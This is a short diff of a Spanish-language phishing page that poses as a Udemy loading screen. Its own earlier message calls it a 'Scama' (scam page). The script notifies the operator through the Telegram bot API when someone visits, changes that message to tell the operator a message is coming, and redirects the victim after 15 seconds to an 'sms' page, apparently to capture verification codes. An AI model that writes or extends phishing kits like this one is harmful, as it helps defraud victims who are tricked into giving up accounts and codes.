@@ -30,19 +30,20 @@
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: 'Alguien ha visitado el Scama.' })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: 'PENDIENTE AL MENSAJE.' })
         })
         .catch(error => console.error('Error al enviar mensaje a Telegram:', error));
         
         // Redirige a otra página después de 15 segundos
         setTimeout(() => {
-            window.location.href = 'cesta.html';
-        }, 5000);
+            window.location.href = 'sms.html.html';
+        }, 15000);
     </script>
 </head>
 <body>
     <div class="loading-container">
         <img src="logo-udemy.svg" alt="Logo Udemy" class="mb-3" width="300">
+        <img src="loader2.gif" alt="Cargando..." class="mb-3" width="80">
         <img src="loader.gif" alt="Cargando..." class="mb-3" width="100">
     </div>
 </body>
